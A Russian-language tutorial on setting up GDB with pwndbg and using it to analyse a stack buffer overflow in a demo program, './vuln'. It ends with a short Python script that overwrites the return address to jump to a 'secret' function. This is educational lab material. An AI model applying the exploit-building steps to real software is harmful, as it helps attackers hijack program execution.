# Использование GDB с расширением pwndbg для анализа уязвимостей

В этом руководстве описывается процесс настройки и использования GDB с расширением pwndbg для анализа бинарных файлов и отладки эксплойтов.

## Установка GDB и pwndbg

### Установка GDB

```bash
# Debian/Ubuntu
sudo apt update
sudo apt install gdb

# Fedora
sudo dnf install gdb

# macOS (с использованием Homebrew)
brew install gdb
```

### Установка pwndbg

pwndbg - это расширение для GDB, которое добавляет множество полезных функций для анализа бинарных файлов и разработки эксплойтов.

```bash
# Клонирование репозитория
git clone https://github.com/pwndbg/pwndbg.git

# Переход в директорию с pwndbg
cd pwndbg

# Установка
./setup.sh
```

## Базовые команды GDB с pwndbg

### Запуск отладчика

```bash
# Запуск GDB с загрузкой бинарного файла
gdb ./vuln

# Указание аргументов командной строки
gdb --args ./vuln arg1 arg2
```

### Основные команды для анализа

```bash
# Запуск программы
run (или r)

# Запуск программы с перенаправлением ввода из файла
run < exploit_input

# Остановка выполнения
Ctrl+C

# Пошаговое выполнение (с заходом в функции)
step (или s)

# Пошаговое выполнение (без захода в функции)
next (или n)

# Продолжение выполнения
continue (или c)

# Установка точки останова на функцию
break vulnerable (или b vulnerable)

# Установка точки останова на адрес
break *0x080484b6

# Удаление точки останова
delete 1 (удаляет точку останова #1)

# Отображение текущего стека вызовов
backtrace (или bt)

# Анализ стека
stack

# Просмотр содержимого стека
telescope $esp 20
```

## Анализ уязвимого приложения с помощью pwndbg

### Шаг 1: Определение размера буфера

1. Загрузите бинарный файл в GDB:
   ```bash
   gdb ./vuln
   ```

2. Установите точку останова на функцию `vulnerable`:
   ```
   break vulnerable
   ```

3. Запустите программу:
   ```
   run
   ```

4. Как только программа остановится в функции `vulnerable`, изучите выделение памяти на стеке:
   ```
   disassemble
   ```

5. Найдите инструкцию, выделяющую пространство на стеке (например, `sub esp, 0x50`), чтобы определить размер буфера.

### Шаг 2: Поиск адреса функции secret

```
# Просмотр всех функций в бинарном файле
info functions

# Отображение адреса функции secret
print secret
```

### Шаг 3: Определение смещения до адреса возврата

1. Создайте циклический паттерн для определения смещения:
   ```
   pattern create 100
   ```

2. Перезапустите программу с созданным паттерном:
   ```
   run
   # Вставьте сгенерированный паттерн
   ```

3. После того, как программа рухнет, определите смещение:
   ```
   pattern search $eip
   ```

### Шаг 4: Проверка эксплойта

1. Перезапустите программу:
   ```
   run < exploit_input
   ```

2. После выполнения программы с эксплойтом, проверьте значение регистра EIP:
   ```
   info registers eip
   ```

3. Убедитесь, что EIP указывает на адрес функции `secret`.

## Дополнительные возможности pwndbg

### Визуализация памяти

```bash
# Отображение участка памяти в виде дампа
hexdump $esp 64

# Отображение содержимого строки
telescope $esp 20

# Отображение информации о куче
heap
```

### Информация о структурах данных

```bash
# Отображение информации о загруженных разделяемых библиотеках
libs

# Отображение информации о сегментах процесса
vmmap

# Поиск строк в памяти
search "Access granted"
```

### Работа с файлами и потоками ввода-вывода

```bash
# Перенаправление ввода из файла
run < exploit_input

# Запись вывода в файл
set logging on
set logging file output.txt
```

## Пример анализа уязвимости переполнения буфера

### 1. Запустите программу и найдите уязвимую функцию

```
gdb ./vuln
break main
run
```

### 2. Проанализируйте поток выполнения программы

```
disassemble main
```

### 3. Установите точку останова на вызов уязвимой функции

```
break vulnerable
continue
```

### 4. Изучите стек и структуру фрейма в уязвимой функции

```
disassemble vulnerable
info frame
telescope $esp 20
```

### 5. Создайте циклический паттерн для определения смещения

```
pattern create 100
```

### 6. Запустите программу с паттерном

```
run
# Введите сгенерированный паттерн
```

### 7. После краха программы определите смещение

```
pattern search $eip
```

### 8. Используйте найденное смещение для создания эксплойта

```python
# exploit.py
import struct

offset = 76  # значение, полученное с помощью pattern search
target_addr = 0x080484b6  # адрес функции secret

payload = b"A" * offset
payload += struct.pack("<I", target_addr)

with open("exploit_input", "wb") as f:
    f.write(payload)
```

### 9. Проверьте эксплойт в отладчике

```
run < exploit_input
```

### 10. Убедитесь, что EIP указывает на адрес функции secret

```
info registers eip
```

## Советы по использованию GDB с pwndbg

### Настройка автоматического запуска команд

Создайте файл `.gdbinit` в домашней директории для настройки автоматического выполнения команд при запуске GDB:

```bash
# ~/.gdbinit
set disassembly-flavor intel
set pagination off
set follow-fork-mode child
```

### Скрипты для GDB

Вы можете создавать скрипты для GDB для автоматизации повторяющихся задач:

```bash
# script.gdb
break vulnerable
run
disassemble
info frame
```

Запускайте GDB с скриптом:
```bash
gdb -x script.gdb ./vuln
```

### Команды для работы с pwndbg

```bash
# Помощь по командам pwndbg
pwndbg

# Установка контрольных точек на вызовы системных функций
trace malloc
```

## Заключение

GDB с расширением pwndbg предоставляет мощные инструменты для анализа бинарных файлов и разработки эксплойтов. С его помощью можно:

1. Анализировать структуру стека и выявлять уязвимости
2. Определять точное смещение для контроля адреса возврата
3. Отслеживать выполнение программы инструкция за инструкцией
4. Визуализировать содержимое памяти и регистров
5. Автоматизировать процесс разработки и тестирования эксплойтов

Эти навыки являются фундаментальными для понимания механизмов работы эксплойтов переполнения буфера и разработки эффективных средств защиты. 